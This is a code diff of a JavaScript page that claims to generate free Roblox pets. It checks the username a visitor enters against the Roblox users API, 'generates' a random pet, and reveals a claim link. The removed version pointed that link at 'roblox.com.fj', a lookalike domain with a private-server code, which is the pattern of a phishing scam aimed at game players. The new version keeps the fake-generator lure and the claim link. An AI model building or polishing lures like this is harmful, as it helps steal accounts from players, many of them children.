@@ -1,45 +1,104 @@
-const checkBtn = document.getElementById('checkBtn');
-const generateBtn = document.getElementById('generateBtn');
-const status = document.getElementById('status');
-const petResult = document.getElementById('petResult');
-const privateServerBtn = document.getElementById('privateServerBtn');
+// A simple debouncing function to limit API calls as the user types
+function debounce(func, delay) {
+    let timeout;
+    return function(...args) {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => func.apply(this, args), delay);
+    };
+}
 
-const pets = ["Dragonfly", "Raccoon", "Queen Bee", "Mimic", "Octopus", "Kitsune"];
+// --- DOM Elements ---
+const usernameInput = document.getElementById('usernameInput');
+const validationMessage = document.getElementById('validationMessage');
+const generatePetBtn = document.getElementById('generatePetBtn');
+const resultArea = document.getElementById('resultArea');
+const resultText = document.getElementById('resultText');
+const claimLink = document.getElementById('claimLink');
 
-// Replace this with your Roblox private server link
-const privateServerLink = "https://roblox.com.fj/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=35951293855754442542885670362";
-privateServerBtn.href = privateServerLink;
+// --- Pet Data ---
+const pets = [
+    "Dragonfly",
+    "Raccoon",
+    "Queen Bee",
+    "Mimic Octopus",
+    "Kitsune"
+];
 
-checkBtn.addEventListener('click', () => {
-    const username = document.getElementById('username').value.trim();
-    if(!username) {
-        status.textContent = "❌ Please enter a username.";
-        generateBtn.style.display = "none";
+// --- Roblox API Check ---
+// The main function that now also fetches user details
+async function checkUsername(username) {
+    if (username.length === 0) {
+        validationMessage.textContent = '';
+        generatePetBtn.disabled = true;
         return;
     }
 
-    status.textContent = "⏳ Checking username...";
-    
-    fetch(`https://api.roblox.com/users/get-by-username?username=${username}`)
-    .then(res => res.json())
-    .then(data => {
-        if(data.Id) {
-            status.textContent = "✅ Username found, you can now generate your pet!";
-            generateBtn.style.display = "inline-block";
-        } else {
-            status.textContent = "❌ Username not found.";
-            generateBtn.style.display = "none";
-        }
-    })
-    .catch(err => {
-        status.textContent = "❌ Error checking username.";
-        generateBtn.style.display = "none";
-        console.error(err);
-    });
-});
+    // Show a loading indicator
+    validationMessage.textContent = 'Checking...';
+    validationMessage.className = 'message';
+    generatePetBtn.disabled = true;
 
-generateBtn.addEventListener('click', () => {
-    const pet = pets[Math.floor(Math.random() * pets.length)];
-    petResult.textContent = `You generated ${pet}!`;
-    privateServerBtn.style.display = "inline-block";
-});
+    try {
+        // Use the new API endpoint to get user details by username
+        const response = await fetch('https://users.roblox.com/v1/usernames/users', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usernames: [username] })
+        });
+
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+
+        const data = await response.json();
+        const user = data.data && data.data.length > 0 ? data.data[0] : null;
+
+        if (user) {
+            // Display the user's name and ID once found
+            validationMessage.innerHTML = `✅ Username found: **${user.name}**<br>User ID: **${user.id}**<br>You can now generate your pet!`;
+            validationMessage.className = 'message success';
+            generatePetBtn.disabled = false;
+        } else {
+            validationMessage.textContent = '❌ Username not found. Please try again.';
+            validationMessage.className = 'message error';
+            generatePetBtn.disabled = true;
+        }
+
+    } catch (error) {
+        console.error('Failed to validate username:', error);
+        validationMessage.textContent = '⚠️ Could not validate username. Try again later.';
+        validationMessage.className = 'message error';
+        generatePetBtn.disabled = true;
+    }
+}
+
+// Add an input event listener with a debounce to the username field
+usernameInput.addEventListener('input', debounce((e) => {
+    checkUsername(e.target.value);
+}, 500));
+
+// --- Pet Generation Logic ---
+function generatePet() {
+    // Clear previous results
+    resultText.textContent = '';
+    claimLink.classList.add('hidden');
+    resultArea.style.opacity = '0';
+
+    // Get a random pet from the array
+    const randomIndex = Math.floor(Math.random() * pets.length);
+    const generatedPet = pets[randomIndex];
+
+    // Display the result
+    setTimeout(() => {
+        resultText.textContent = `You generated a ${generatedPet}!`;
+        claimLink.classList.remove('hidden');
+        resultArea.style.opacity = '1';
+        generatePetBtn.disabled = true; // Disable the button after generation
+        validationMessage.textContent = ''; // Hide validation message
+        validationMessage.className = 'message';
+    }, 500);
+}
+
+// Add event listener to the generate button
+generatePetBtn.addEventListener('click', generatePet);
+
